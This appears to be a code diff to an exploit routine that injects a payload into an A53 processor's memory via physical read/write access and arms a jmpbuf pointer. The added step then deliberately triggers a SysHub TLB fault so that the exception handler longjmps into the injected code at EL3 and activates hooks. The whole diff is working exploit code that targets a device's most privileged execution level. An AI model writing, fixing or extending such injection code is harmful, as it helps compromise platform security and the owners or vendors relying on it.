@@ -840,7 +840,7 @@ int deci5s_inject_payload(struct phys_rw_ctx *ctx)
      * IMPORTANT: This must be the LAST write, after all code/data is in place.
      */
     {
-        uint64_t jmpbuf_ptr = (uint64_t)MP4_JMPBUF_OFFSET;  /* VA 0x3EF000 */
+        uint64_t jmpbuf_ptr = A53_IDENTITY_BASE + MP4_JMPBUF_OFFSET;  /* VA 0x883EF000 */
         printf("[*] DECI5S: Arming jmpbuf trigger at VA 0x%x = 0x%llx...\n",
                A53_JMPBUF_PTR_OFF, (unsigned long long)jmpbuf_ptr);
 
@@ -880,13 +880,37 @@ int deci5s_inject_payload(struct phys_rw_ctx *ctx)
 
     /* Verify jmpbuf trigger is armed */
     uint64_t armed_val = 0;
+    uint64_t expect_ptr = A53_IDENTITY_BASE + MP4_JMPBUF_OFFSET;
     deci5s_read(A53_DRAM_PA_BASE + A53_JMPBUF_PTR_OFF, &armed_val, 8);
-    printf("[DECI5S] Verify jmpbuf ptr @ 0x%x: 0x%llx (expect 0x%x) %s\n",
+    printf("[DECI5S] Verify jmpbuf ptr @ 0x%x: 0x%llx (expect 0x%llx) %s\n",
            A53_JMPBUF_PTR_OFF, (unsigned long long)armed_val,
-           MP4_JMPBUF_OFFSET,
-           (uint32_t)armed_val == MP4_JMPBUF_OFFSET ? "ARMED" : "MISMATCH");
+           (unsigned long long)expect_ptr,
+           armed_val == expect_ptr ? "ARMED" : "MISMATCH");
 
     printf("[+] DECI5S: Injection complete — jmpbuf armed\n");
-    printf("[+] Next A53 exception will trigger: IC IALLU → thunk active\n");
+
+    /* Step 8: Trigger SysHub violation to activate the jmpbuf.
+     *
+     * The jmpbuf longjmp mechanism fires on SysHub TLB faults, NOT on
+     * arbitrary IRQs. Reading from an unmapped SysHub VA (0x70000000)
+     * generates GIC IRQ 33 → exception handler → sub_107BE0(qword_123180+8)
+     * → longjmp to bootstrap → IC IALLU → ERET → hooks active.
+     *
+     * This read will timeout (A53 longjmps out before completing the
+     * DECI5S read response) — that's expected and intentional.
+     */
+    printf("[*] DECI5S: Triggering SysHub violation for IC IALLU...\n");
+    {
+        uint32_t dummy = 0;
+        int trigger_ret = deci5s_read_el3_va(0x70000000ULL, &dummy, 4);
+        printf("[DECI5S] SysHub trigger: ret=%d (timeout expected)\n",
+               trigger_ret);
+    }
+
+    /* Give the A53 a moment to complete the bootstrap sequence
+     * (IC IALLU + ERET back to IRQ handler loop). */
+    usleep(100000);  /* 100ms */
+
+    printf("[+] DECI5S: Injection complete — hooks should be active\n");
     return 0;
 }
